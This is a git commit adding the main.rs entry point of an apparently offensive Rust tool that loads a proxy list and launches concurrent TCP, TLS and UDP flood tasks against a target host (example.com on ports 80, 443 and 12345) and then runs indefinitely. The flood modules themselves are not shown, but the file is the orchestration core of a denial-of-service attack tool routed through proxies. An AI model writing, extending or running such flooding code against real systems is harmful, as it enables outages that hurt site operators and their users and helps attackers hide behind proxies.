3f3e5892ab3eaa6ac5f4b9de4ac255a24b4a3057
Matryrx <156548662+Matryrx@users.noreply.github.com>
2025-06-12 15:02:31 +0700

    Create main.rs

---
+++ src/main.rs
@@ -0,0 +1,29 @@
+mod utils;
+mod flood {
+    pub mod tcp;
+    pub mod udp;
+    pub mod tls;
+}
+
+use utils::load_proxies;
+use tokio::task;
+
+#[tokio::main]
+async fn main() {
+    let proxies = load_proxies();
+    let target = "example.com";
+    let port_tcp = 80;
+    let port_udp = 12345;
+    let port_tls = 443;
+
+    let proxy_copy1 = proxies.clone();
+    let proxy_copy2 = proxies.clone();
+
+    task::spawn(flood::tcp::start_tcp_flood(target, port_tcp, proxy_copy1));
+    task::spawn(flood::tls::start_tls_flood(target, port_tls, proxy_copy2));
+    task::spawn(flood::udp::start_udp_flood(target, port_udp));
+
+    loop {
+        tokio::time::sleep(tokio::time::Duration::from_secs(999999)).await;
+    }
+}
